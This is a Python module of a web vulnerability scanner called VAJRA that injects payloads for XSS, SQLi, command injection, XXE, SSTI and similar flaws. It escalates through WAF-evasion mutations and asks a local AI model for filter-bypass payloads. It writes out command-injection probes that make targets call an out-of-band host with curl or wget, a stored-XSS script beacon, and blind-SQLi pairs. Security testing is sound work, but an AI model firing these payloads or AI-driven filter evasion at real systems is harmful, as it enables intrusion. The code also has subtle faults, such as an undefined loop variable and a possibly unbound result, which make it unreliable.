"""VAJRA web vulnerability scanner — driven by the adaptive payload engine.
Every injection class runs the full payload bank; when a WAF interferes the
attacker escalates through fingerprint-specific mutation chains until the
motive is achieved or the arsenal for that class is exhausted.

Covers form fields, GET query params, JSON API bodies and XML bodies; each
transport gets the right encoding so XXE / JSON-injection / NoSQL surfaces
that a form-only scanner would try are actually probed."""
import json as _json
import re
import time
from urllib.parse import urlparse, parse_qsl, urlencode

from core.database import Finding
from core.http_client import build_multipart, raw_http
from core.payload_engine import (
    AdaptiveAttacker, BANKS, SQLI_BANK, TIME_SQLI,
    motive_reflect, motive_lfi, motive_rce,
    motive_ssti, motive_redirect, motive_header,
    classify_response, Verdict, UID_RE, SQL_ERR_RE)

XXE_MARK_RE = re.compile(r"root:x:|daemon:x:|bin:x:|uid=\d+\(root\)|"
                         r"\[extensions\]|ssh-dss|nsaIDS\b")
XXE_ERR_RE = re.compile(r"DOCTYPE|ENTITY|XML|well-formed|parser error|"
                        r"SAXParseException|DOMException|failed to open stream")
LDAP_ERR_RE = re.compile(r"malformed searchFilter|LDAP.*(error|exception)|"
                         r"BAD_FILTER|protocol error|Invalid filter|\bprovided to search")
XPATH_ERR_RE = re.compile(r"XPathException|XPath.*(error|exception)|"
                          r"javax\.xml|stacktrace|stack trace|not implemented by DOM")
REFLECT_MARKER = re.compile(r"vaJrFlAg|vjr-\d+")


class Point:
    def __init__(self, url, method, fields, origin, kind="form"):
        self.url = url
        self.method = method.upper()
        self.fields = fields or []
        self.origin = origin
        self.kind = kind


def send_point(engine, pt, param, value):
    data = {}
    for k, v in pt.fields:
        if k != param:
            data[k] = v
    data[param] = value
    if pt.kind in ("json", "xml"):
        base = pt.url.split("?")[0]
        try:
            asnum = int(value)
        except Exception:
            asnum = None
        if pt.kind == "json":
            body = {}
            for k, v in pt.fields:
                body[k] = v
            body[param] = value
            return engine.http.request(pt.method, base, json_body=body,
                                       allow_redirects=False)
        if isinstance(value, str) and value.lstrip().startswith("<?xml"):
            return engine.http.request(pt.method, base, data=value.encode(),
                                       headers={"Content-Type": "application/xml"},
                                       allow_redirects=False)
        inner = "".join("<%s>%s</%s>" % (k, v, k) for k, v in data.items())
        doc = ('<?xml version="1.0" encoding="UTF-8"?><vajra>%s</vajra>'
               % inner)
        return engine.http.request(pt.method, base, data=doc.encode(),
                                   headers={"Content-Type": "application/xml"},
                                   allow_redirects=False)
    if pt.method == "GET":
        return engine.http.get(pt.url.split("?")[0] + "?" + urlencode(data),
                               allow_redirects=False)
    return engine.http.post(pt.url, data=data, allow_redirects=False)


_SECRET_BUMP = "\x00"


def build_points(engine):
    """Every injection point the suite will attack.

    Coverage-first: the mandatory pass adds exactly one point per GET-query
    endpoint and one point per FORM (a form point carries ALL of that form's
    fields and the run loop attacks every field of it), so no form on any
    crawled endpoint can be silently dropped by the attack budget. The
    ``max_injection_points`` budget then only trims the *extra* API/query
    endpoints, never whole forms or form parameters."""
    pts, seen = [], set()
    limit = int(engine.cfg("max_injection_points", 60))
    mandatory = []
    for page in engine.state.get("pages", []):
        u = page["url"]
        parsed = urlparse(u)
        qs = parse_qsl(parsed.query)
        if qs:
            key = ("get", parsed.path)
            if key not in seen:
                seen.add(key)
                mandatory.append(Point(u, "GET", qs, page["url"], "form"))
        for f in page.get("forms", []):
            fields = [fd for fd in f.get("fields", [])
                      if fd["type"] in ("submit", "button")]
            if len(fields) == len(f.get("fields", [])):
                continue  # a form with ONLY button/submit inputs has nothing
            key = (f["method"], f["action"])
            if key in seen:
                continue
            seen.add(key)
            mandatory.append(Point(f["action"], f["method"],
                                   [(x["name"], x.get("value", ""))
                                    for x in f["fields"]],
                                   f.get("page") or page["url"], "form"))
    api = engine.state.get("api") or {}
    extras = []
    for ep in api.get("endpoints", []):
        meth = (ep.get("method") or "GET").upper()
        if meth in ("OPTIONS", "HEAD"):
            continue
        path = ep.get("path", "")
        url = ep.get("url") or (ep.get("base", "") + path)
        fields = []
        ct = (ep.get("ct") or "").lower()
        kind = "json" if "xml" not in ct else "xml"
        if meth == "GET":
            qs = parse_qsl(urlparse(url).query)
            for n, _v in qs:
                fields.append((n, _v))
        key = ("api", meth, path, kind)
        if key in seen:
            continue
        seen.add(key)
        extras.append(Point(url, meth, fields, "api:%s %s" % (meth, path),
                            kind))
    room = max(0, limit - len(mandatory))
    pts.extend(mandatory)
    pts.extend(extras[:room])
    if len(mandatory) > limit:
        engine.log.warn(
            "[vulnscan] %d endpoints+forms exceed the %d-point budget; "
            "coverage-first ordering still tests every form, only the "
            "API/query extras beyond the budget are trimmed" %
            (len(mandatory), limit))
    return pts


def ai_second_pass(engine, sender, motive, cls, waf, blocked_sample, context):
    """When filters defeat the whole bank, consult the local Qwen3 AI."""
    try:
        ai = getattr(engine, "ai", None)
    except Exception:
        return None
    if not ai or not ai.available():
        return None
    sugg = ai.suggest_payloads(cls, waf, blocked_sample, context)
    if not sugg:
        return None
    att = AdaptiveAttacker(sender, motive, waf=waf, max_direct=len(sugg),
                           max_mutants=0)
    res = att.run(sugg)
    engine._collect_evasion(att)
    if res.achieved and not res.technique.startswith("ai"):
        res.technique = "ai:" + res.technique
    return res


URL_PARAM_HINTS = ("url", "redirect", "next", "target", "dest", "goto",
                   "return", "continue", "link", "rurl", "returnto")
PATHY_HINTS = ("path", "file", "page", "include", "tpl", "doc", "dir",
               "lang", "template", "read", "view", "load", "src")
CMD_HINTS = ("cmd", "exec", "command", "ping", "host", "ip", "domain")
SEARCH_HINTS = ("search", "q", "query", "filter", "user", "login", "auth",
                "uid", "dn", "name", "email", "find", "lookup")
SSTI_HINTS = ("template", "view", "render", "name", "message", "greet",
              "page", "lang", "theme", "layout", "title")

SEV = {"xss": "high", "sqli": "critical", "sqli_time": "critical",
       "sqli_blind": "high", "lfi": "critical", "rce": "critical",
       "ssti": "critical", "redirect": "medium", "nosql": "critical",
       "crlf": "medium", "xxe": "critical", "ldap": "high",
       "xpath": "high", "hpp": "low", "hostinject": "medium",
       "stored_xss": "high", "rce_blind": "high", "ssrf_blind": "high"}
TITLES = {
    "xss": "Reflected Cross-Site Scripting (param '%s')",
    "sqli": "SQL Injection confirmed (param '%s')",
    "sqli_time": "Time-based Blind SQL Injection (param '%s')",
    "sqli_blind": "Boolean-based Blind SQL Injection (param '%s')",
    "lfi": "Local File Inclusion — system file read (param '%s')",
    "rce": "OS Command Injection — execution confirmed (param '%s')",
    "ssti": "Server-Side Template Injection → RCE surface (param '%s')",
    "redirect": "Open Redirect (param '%s')",
    "nosql": "NoSQL Operator Injection accepted (param '%s')",
    "crlf": "CRLF / HTTP Response Splitting (param '%s')",
    "xxe": "XML External Entity processing — local file read (param '%s')",
    "ldap": "LDAP Injection — filter manipulation (param '%s')",
    "xpath": "XPath Injection — query manipulation (param '%s')",
    "hpp": "HTTP Parameter Pollution — duplicate-param confusion (param '%s')",
    "hostinject": "Host Header Injection / web-cache poisoning surface",
    "stored_xss": "Stored Cross-Site Scripting — form deposit reflected (%s)",
    "rce_blind": "Blind OS Command Injection — OOB callback (param '%s')",
    "ssrf_blind": "Blind SSRF — OOB callback (param '%s')",
}
REM = {
    "xss": "Contextual output encoding + strict CSP.",
    "sqli": "Parameterized queries; least-privilege DB accounts.",
    "sqli_time": "Parameterized queries; query latency monitoring.",
    "sqli_blind": "Parameterized queries; differential timing/heuristics.",
    "lfi": "Allowlist identifiers; chroot/containment.",
    "rce": "Eliminate shell invocation with user input; sandbox.",
    "ssti": "Render input as data, never as template source.",
    "redirect": "Strict destination allowlist.",
    "nosql": "Input type enforcement; disable $where eval.",
    "crlf": "Reject CR/LF in header values.",
    "xxe": "Disable DTDs/external entities in XML parser.",
    "ldap": "Escape LDAP metacharacters; filter allowlists.",
    "xpath": "Parameterize XPath expressions; evaluate as data.",
    "hpp": "Bind to the same parameter the framework uses; reject dupes.",
    "hostinject": "Validate Host; ignore X-Forwarded-* from untrusted edges.",
    "stored_xss": "Contextual output encoding on storage + render paths.",
    "rce_blind": "Eliminate shell invocation with user input; sandbox.",
    "ssrf_blind": "Allowlist outbound hosts; abort on loopback/link-local.",
}


def _confidence_for(cls, confidence):
    """Proof-level classes only accept distinctive REAL markers in their
    motive (actual file contents, executed shell output, computed template
    result, OOB callback), so confirmation == reproduction == 'certain'.
    Time-based signals stay tentative-heuristic (capped at medium)."""
    if confidence == "firm" and cls in (
            "lfi", "rce", "ssti", "xxe", "rce_blind"):
        return "certain"
    if cls == "sqli_time":
        return "possible"
    return confidence


def _poc_gate(cls, confidence, evidence):
    """No vulnerability finding is ever reported above 'possible' without a
    captured proof snippet — a missing PoC means exploitation was NOT
    demonstrated, so the report must not claim it was."""
    if cls in ("sqli", "xss", "lfi", "rce", "ssti", "xxe", "redirect",
               "nosql", "rce_blind", "sqli_time") and not (evidence or "").strip():
        return "possible"
    return confidence


def run(engine):
    t = engine.target
    targets = engine.state.get("web_targets") or []
    if not targets:
        return
    waf = engine.state.get("waf") or None
    direct_cap = int(engine.cfg("max_payloads_direct", 60))
    mutant_cap = int(engine.cfg("max_mutants", 12))
    deep = bool(engine.cfg("deep", False)) or engine.profile in ("full", "deep")
    points = build_points(engine)
    tested = set()
    blocked_stats = {}
    class_hits = {}
    pt_total = max(1, len(points))
    pt_done = 0

    def record(cls, pt, k, res, confidence="firm"):
        title = TITLES[cls] % k
        sev = SEV[cls]
        if cls == "xss" and res.technique == "direct":
            sev = "high"
        confidence = _confidence_for(cls, confidence)
        confidence = _poc_gate(cls, confidence, res.evidence)
        engine.db.add_finding(Finding(
            t.display, "web.vulnscan", "web-vuln", sev, title,
            detail="Origin: %s\nMethod: %s (%s)\nParameter: %s\nWAF: %s\n"
                   "Technique: %s\nAttempts: %d (blocked: %d)" %
                   (pt.origin, pt.method, pt.kind, k, waf or "none detected",
                    res.technique, res.attempts, res.blocked),
            evidence=res.evidence[:3000], remediation=REM[cls],
            confidence=confidence))
        engine.log.finding("[%s] %s -> %s (%s)" %
                           (cls.upper(), pt.origin.split("?")[0], k,
                            res.technique))

    for pt in points:
        pt_done += 1
        engine.progress(min(pt_done, pt_total), pt_total,
                        detail="inject %d/%d" % (min(pt_done, pt_total),
                                                 pt_total))
        fields = [fd[0] for fd in pt.fields]
        if pt.kind == "xml":
            _run_xml_class(engine, pt, t, targets, waf, direct_cap,
                           mutant_cap, record)
            continue
        for k in (fields if fields else [k or "id"]):
            pkey = (pt.url.split("?")[0], pt.method, k)
            if pkey in tested:
                continue
            tested.add(pkey)

            def sender(payload, _pt=pt, _k=k):
                return send_point(engine, _pt, _k, payload)

            base_r = sender("vjrbase")
            bbody = getattr(base_r, "body", "")[:60000]
            blen, bstatus = len(bbody), base_r.status
            low_base = bbody.lower()
            origv = dict(pt.fields).get(k, "")

            def not_blocked(r):
                v, _why = classify_response(r)
                return v != Verdict.BLOCKED

            # ---- XSS ----
            att = AdaptiveAttacker(sender, motive_reflect, waf=waf,
                                   max_direct=direct_cap,
                                   max_mutants=mutant_cap)
            rx = att.run(BANKS["xss"])
            engine._collect_evasion(att)
            if not rx.achieved and att.blocked >= 2:
                rx = ai_second_pass(engine, sender, motive_reflect, "XSS",
                                    waf, att.evasion_log[-1]["original"]
                                    if att.evasion_log else "", pt.origin) or rx
            if rx.achieved:
                record("xss", pt, k, rx)

            cmd_param = any(h in k.lower() for h in CMD_HINTS)

            # ---- SQLi (error) ----
            def sqli_motive(p, r):
                return not_blocked(r) and \
                    bool(SQL_ERR_RE.search(getattr(r, "body", "")[:60000]))

            att = AdaptiveAttacker(sender, sqli_motive, waf=waf,
                                   max_direct=direct_cap,
                                   max_mutants=mutant_cap)
            rs = att.run(SQLI_BANK)
            engine._collect_evasion(att)
            if not rs.achieved and att.blocked >= 2:
                rs = ai_second_pass(engine, sender, sqli_motive, "SQLi",
                                    waf, att.evasion_log[-1]["original"]
                                    if att.evasion_log else "", pt.origin) or rs
            if rs.achieved:
                record("sqli", pt, k, rs)
                class_hits.setdefault(pkey, set()).add("sqli")

            # ---- SQLi (boolean-blind differential) ----
            if not (rs.achieved or class_hits.get(pkey)) and deep and \
                    not REFLECT_MARKER.search(bbody) and \
                    len(str(origv)) <= 80:
                bolt = _blind_sqli(engine, sender, k, origv, base_r,
                                   bstatus, blen)
                if bolt:
                    record("sqli_blind", pt, k, bolt, confidence="possible")

            # ---- LFI ----
            pathy = "rce" not in class_hits.get(pkey, ())
            if pathy and any(h in k.lower() for h in
                             PATHY_HINTS + ("name", "id", "file", "page")):
                att = AdaptiveAttacker(sender, motive_lfi, waf=waf,
                                       max_direct=direct_cap,
                                       max_mutants=mutant_cap)
                rl = att.run(BANKS["lfi"])
                engine._collect_evasion(att)
                if not rl.achieved and att.blocked >= 2:
                    rl = ai_second_pass(engine, sender, motive_lfi, "LFI",
                                        waf, att.evasion_log[-1]["original"]
                                        if att.evasion_log else "",
                                        pt.origin) or rl
                if rl.achieved:
                    record("lfi", pt, k, rl)
                    class_hits.setdefault(pkey, set()).add("lfi")

            # ---- RCE (reflected echo) ----
            if cmd_param or len(fields) <= 3:
                att = AdaptiveAttacker(sender, motive_rce, waf=waf,
                                       max_direct=min(direct_cap, 120),
                                       max_mutants=mutant_cap)
                rr = att.run(BANKS["rce"])
                engine._collect_evasion(att)
                if not rr.achieved and att.blocked >= 2:
                    rr = ai_second_pass(engine, sender, motive_rce, "RCE",
                                        waf, att.evasion_log[-1]["original"]
                                        if att.evasion_log else "",
                                        pt.origin) or rr
                if rr.achieved:
                    record("rce", pt, k, rr)
                    class_hits.setdefault(pkey, set()).add("rce")

            # ---- blind RCE via OOB (aggressive/interactive) ----
            oob = getattr(engine, "oob", None)
            if oob and rr is not None and not rr.achieved and \
                    (cmd_param or len(fields) <= 3):
                br = _blind_rce_oob(engine, sender, pt, k, oob)
                if br:
                    record("rce_blind", pt, k, br)

            # ---- SSTI ----
            if any(h in k.lower() for h in SSTI_HINTS):
                for marker_expr, marker_val in (("{{7*'7'}}", "7777777"),
                                                ("{{7*7}}", "49")):
                    if marker_val in low_base:
                        continue
                    att = AdaptiveAttacker(sender, motive_ssti(marker_val),
                                           waf=waf, max_direct=6,
                                           max_mutants=mutant_cap)
                    rst = att.run([marker_expr])
                    engine._collect_evasion(att)
                    if rst.achieved:
                        record("ssti", pt, k, rst)
                        # escalate with the full engine-agnostic SSTI_RCE bank
                        att2 = AdaptiveAttacker(sender, motive_ssti_diff(blen),
                                                waf=waf,
                                                max_direct=min(direct_cap, 60),
                                                max_mutants=mutant_cap)
                        rese = att2.run(BANKS["ssti"])
                        engine._collect_evasion(att2)
                        if rese.achieved:
                            rese.technique = "ssti:" + rese.technique
                            record("ssti", pt, k, rese)
                        break

            # ---- Open redirect ----
            if any(h in k.lower() for h in URL_PARAM_HINTS):
                att = AdaptiveAttacker(sender,
                                       motive_redirect("vajra-oob.example"),
                                       waf=waf, max_direct=25,
                                       max_mutants=mutant_cap)
                rd = att.run(BANKS["redirect"])
                engine._collect_evasion(att)
                if rd.achieved:
                    record("redirect", pt, k, rd)

            # ---- NoSQL ----
            if any(h in k.lower() for h in ("user", "login", "pass", "email",
                                            "auth")):
                def nosql_motive(p, r):
                    body = getattr(r, "body", "")
                    return r.status != bstatus and 200 <= r.status < 400 or \
                        (abs(len(body) - blen) > max(60, int(blen * 0.06)))
                att = AdaptiveAttacker(sender, nosql_motive, waf=waf,
                                       max_direct=14, max_mutants=6)
                rn = att.run(BANKS["nosql"])
                engine._collect_evasion(att)
                if rn.achieved:
                    record("nosql", pt, k, rn)

            # ---- LDAP / XPath ----
            if any(h in k.lower() for h in ("user", "login", "auth", "uid",
                                            "dn", "filter", "search", "name",
                                            "email")):
                for cls, bank, emark in (("ldap", "ldap", LDAP_ERR_RE),
                                         ("xpath", "xpath", XPATH_ERR_RE)):
                    def diff_motive(p, r):
                        return not_blocked(r) and \
                            (bool(emark.search(r.body[:60000])) or
                             abs(len(r.body) - blen) >
                             max(90, int(blen * 0.1)))
                    att = AdaptiveAttacker(sender, diff_motive, waf=waf,
                                           max_direct=12, max_mutants=4)
                    rd = att.run(BANKS[cls])
                    engine._collect_evasion(att)
                    if rd.achieved:
                        record(cls, pt, k, rd)

            # ---- HPP (duplicate-param) ----
            if pt.kind in ("form", "json") and \
                    "submit" not in k.lower():
                _hpp_test(engine, pt, k, sender, bstatus, blen, record)

            # ---- CRLF ----
            crlf_probe = "vjr%0d%0aX-Vajra-Probe: 1"
            rc_ = sender(crlf_probe)
            if "x-vajra-probe" in {h.lower() for h in rc_.headers}:
                att_fake = AdaptiveAttacker(sender, motive_header("x-vajra-probe"),
                                            waf=waf, max_direct=1,
                                            max_mutants=4)
                rcx = att_fake.run([crlf_probe])
                engine._collect_evasion(att_fake)
                if rcx.achieved:
                    record("crlf", pt, k, rcx)

            # ---- time-based blind SQLi (deep profiles) ----
            if deep and len(str(origv)) <= 40 and not origv.isdigit() or \
                    (deep and re.match(r"^\d+$|^[a-z_]+$", str(origv))):
                for tp in TIME_SQLI[:5]:
                    t0 = time.time()
                    rt = sender(str(origv) + " " + tp)
                    took = time.time() - t0
                    if took > 5.0 and rt.status == bstatus:
                        fake_res = _mk_result(tp, "delay %.1fs" % took)
                        record("sqli_time", pt, k, fake_res)
                        break
    _check_methods(engine, targets)
    if deep:
        _stored_pass(engine, points, targets, waf, record)
    _check_host_header(engine, targets)
    engine.state.setdefault("blocked_stats", blocked_stats)


def _sst_math_motive_wrap(blen):
    return motive_ssti_diff(blen)


def motive_ssti_diff(blen):
    def m(p, r):
        body = getattr(r, "body", "")
        return abs(len(body) - blen) > max(120, int(blen * 0.12))
    return m


def _run_xml_class(engine, pt, t, targets, waf, direct_cap, mutant_cap, record):
    """Whole-body XXE probing for XML endpoints: the bank members are complete
    XML documents, each replaces the request body wholesale."""
    def sender(payload):
        return engine.http.request(pt.method, pt.url.split("?")[0],
                                   data=payload.encode() if isinstance(payload, str)
                                   else payload,
                                   headers={"Content-Type": "application/xml"},
                                   allow_redirects=False)
    base_r = sender("<vajra/>")
    bstatus, blen = base_r.status, len(getattr(base_r, "body", ""))

    def xxe_motive(p, r):
        body = getattr(r, "body", "")[:60000]
        if not XXE_MARK_RE.search(body):
            return False
        same = r.status == bstatus
        return same or r.status in (200, 500)

    att = AdaptiveAttacker(sender, xxe_motive, waf=waf,
                           max_direct=min(direct_cap, len(BANKS["xxe"])),
                           max_mutants=mutant_cap)
    rx = att.run(BANKS["xxe"])
    engine._collect_evasion(att)
    if rx.achieved:
        record("xxe", pt, "XML_BODY", rx)
    engine.state.setdefault("xml_probed", True)


def _blind_sqli(engine, sender, k, origv, base_r, bstatus, blen):
    """Two-round true/false differential. Skips params that reflect their own
    raw value (would false-positive on payload length)."""
    low_base = getattr(base_r, "body", "").lower()
    if str(origv) in low_base:
        return None
    pairs = [
        ("' AND '1'='1'-- -", "' AND '1'='2'-- -"),
        ('" AND "1"="1"-- -', '" AND "1"="2"-- -'),
        (" AND 1=1-- -", " AND 1=2-- -"),
    ]
    for ta, fb in pairs:
        try:
            ra = sender(str(origv) + ta)
            rb = sender(str(origv) + fb)
        except Exception:
            continue
        la, lb = len(ra.body), len(rb.body)
        if not (200 <= ra.status < 400 and 200 <= rb.status < 400):
            continue
        if la == lb:
            continue
        span = max(la, lb)
        if abs(la - lb) < max(6, int(span * 0.015)):
            continue
        ra2 = sender(str(origv) + ta)
        if abs(len(ra2.body) - la) > max(4, int(span * 0.004)):
            continue
        return _mk_result("%s%s%s" % (origv, ta, ""),
                          "A:len=%d B:len=%d (stable)" % (la, lb))
    return None


def _hpp_test(engine, pt, k, sender, bstatus, blen, record):
    marker = "vjr-hpp-%d" % (time.time() % 10000)
    if pt.kind == "json":
        base = pt.url.split("?")[0]
        res = engine.http.request(pt.method, base,
                                  json_body={k: [marker, marker]},
                                  allow_redirects=False)
    else:
        dup = "&".join(["%s=%s" % (k, marker)] * 2)
        url = pt.url
        if pt.method == "GET":
            sep = "&" if "?" in url else "?"
            res = engine.http.get(url + sep + dup, allow_redirects=False)
        else:
            data = dict(pt.fields)
            body = "&".join("%s=%s" % (n, v) for n, v in data.items()) + \
                "&" + dup
            res = engine.http.request("POST", url, data=body.encode(),
                                      headers={"Content-Type":
                                               "application/x-www-form-urlencoded"},
                                      allow_redirects=False)
    body = getattr(res, "body", "")
    if res.status == bstatus and body.count(marker) >= 2:
        record("hpp", pt, k, _mk_result(marker, "parameter duplicated, "
                                          "parser merged values (2 echoes)"))


def _blind_rce_oob(engine, sender, pt, k, oob):
    token = oob.token
    cb = oob.url("rce", host=None)
    progs = [("curl", "%s -s" % cb), ("wget", "-q %s -O /dev/null" % cb),
             ("nslookup", "%s" % cb), ("ping", "-c1 -W1 %s" % cb)]
    bench = [("; %s; true" % c, "& %s &" % c, "| %s #" % c, "`%s`" % c,
              "$(%s)" % c) for c, _ in progs]
    # build limited set: few well-known separators x callback hosts
    sep_tmpl = [";%s #", "|%s #", "&&%s", "%0a%s%0a", "`%s`", "$(%s)"]
    probes = []
    for c, args in progs:
        cmd = "%s %s" % (c, args.replace("<oob>", cb)) if "<oob>" in args \
            else "%s %s" % (c, args)
        for st in sep_tmpl:
            probes.append(st % cmd)
    before = len(oob.hits())
    for p in probes[:24]:
        try:
            sender(p)
        except Exception:
            continue
    time.sleep(0.8)
    new = [h for h in oob.hits() if h["path"].startswith("/rce/")]
    if new:
        return _mk_result(probes[0], "OOB callback: %s" % new[-1]["path"])
    return None


def _stored_pass(engine, points, targets, waf, record):
    """Deposit an XSS beacon into non-login submit forms, then re-fetch crawl
    pages looking for the stored echo."""
    bead = 'vjr740<script>document.body.appendChild(document.createElement(' \
           '"img")).src="//vajra-oob.example/x/"</script>'
    targets_by_url = {t["url"]: t for t in targets}
    for pt in points:
        if pt.kind != "form" or pt.method != "POST":
            continue
        has_pass = any(n in ("password", "pass", "pwd") for n, _ in pt.fields)
        if has_pass:
            continue
        addr = pt.url.split("?")[0]
        data = dict(pt.fields)
        fill = 0
        for n, v in list(data.items()):
            if n in ("submit", "button"):
                continue
            if v == "":
                data[n] = bead
                fill += 1
            elif n in ("name", "message", "comment", "title", "subject",
                       "bio", "content", "text", "review", "feedback"):
                data[n] = bead
                fill += 1
        if not fill:
            continue
        try:
            engine.http.post(addr, data=data, allow_redirects=False)
        except Exception:
            continue
    for page in engine.state.get("pages", [])[:20]:
        if bead[:10] in page.get("body", ""):
            record("stored_xss", Point(page["url"], "GET", [], page["url"]),
                   "stored-response", _mk_result(page["url"],
                                                 "beacon rendered in %s"
                                                 % page["url"]),
                   confidence="firm")


def _check_host_header(engine, targets):
    """Host-header injection / web-cache poisoning surface: send a Host (and
    X-Forwarded-Host) override via raw socket and look for reflection into
    body or Location."""
    hosty = "vajra-oob.example"
    for wt in targets[:6]:
        base = wt["url"].rstrip("/")
        pr = urlparse(base)
        host = pr.hostname
        port = pr.port or (443 if pr.scheme == "https" else 80)
        tls = pr.scheme == "https"
        path = pr.path or "/"
        for hdr in ("Host", "X-Forwarded-Host"):
            req = "%s %s HTTP/1.1\r\n%s: %s\r\nConnection: close\r\n\r\n" % (
                "GET", path, hdr, hosty)
            raw = raw_http(host, port, req, tls=tls, timeout=4, socks5=getattr(engine, 'socks', None))
            if not raw:
                continue
            head, _, body = raw.partition(b"\r\n\r\n")
            loc = b""
            for line in head.split(b"\r\n"):
                if line.lower().startswith(b"location:"):
                    loc = line
            if hosty.encode() in body or hosty.encode() in loc:
                if hosty.encode() in body:
                    i = body.find(hosty.encode())
                    snippet = body[max(0, i - 160):i + 220]
                else:
                    snippet = loc
                detail_w = "the response body" if hosty.encode() in body \
                    else "Location header"
                engine.db.add_finding(Finding(
                    engine.target.display, "web.vulnscan",
                    "web-vuln", "medium",
                    "Host Header Injection / web-cache poisoning surface",
                    detail="%s: %s reflected into %s on %s" % (
                        hdr, hosty, detail_w, base),
                    evidence=("raw socket GET %s with %s: %s\n--- "
                              "reflected occurrence ---\n%s"
                              % (path, hdr, hosty,
                                 snippet.decode("utf-8", "replace")[:600])),
                    remediation=REM["hostinject"],
                    confidence="firm"))
                engine.log.finding("[HOST-INJECT] %s reflected via %s at %s"
                                   % (hosty, hdr, base))
                return


class _Res:
    pass


def _mk_result(payload, note):
    r = _Res()
    r.success = payload
    r.technique = note
    r.evidence = "payload=%s\n%s" % (payload, note)
    r.attempts = 1
    r.blocked = 0
    r.evasion_log = []
    return r


def _check_methods(engine, targets):
    for wt in targets:
        base = wt["url"].rstrip("/")
        r = engine.http.options(base)
        allow = r.headers.get("allow", "") or r.headers.get("public", "")
        danger = [m for m in ("PUT", "DELETE", "TRACE", "CONNECT", "MOVE")
                  if m in allow.upper()]
        if danger:
            engine.db.add_finding(Finding(
                engine.target.display, "web.vulnscan", "misconfiguration",
                "medium" if "TRACE" in danger else "low",
                "Dangerous HTTP methods advertised: %s" % ", ".join(danger),
                evidence="OPTIONS %s -> Allow: %s" % (base, allow),
                remediation="Disable unused HTTP methods at the server config.",
                confidence="firm"))
        tr = engine.http.request("TRACE", base, headers={"Vajra-Probe": "1"})
        if tr.status == 200 and "vajra-probe" in tr.body.lower().replace("-", ""):
            engine.db.add_finding(Finding(
                engine.target.display, "web.vulnscan", "misconfiguration",
                "medium", "TRACE enabled (Cross-Site Tracing surface)",
                evidence="TRACE echoed request headers", confidence="firm"))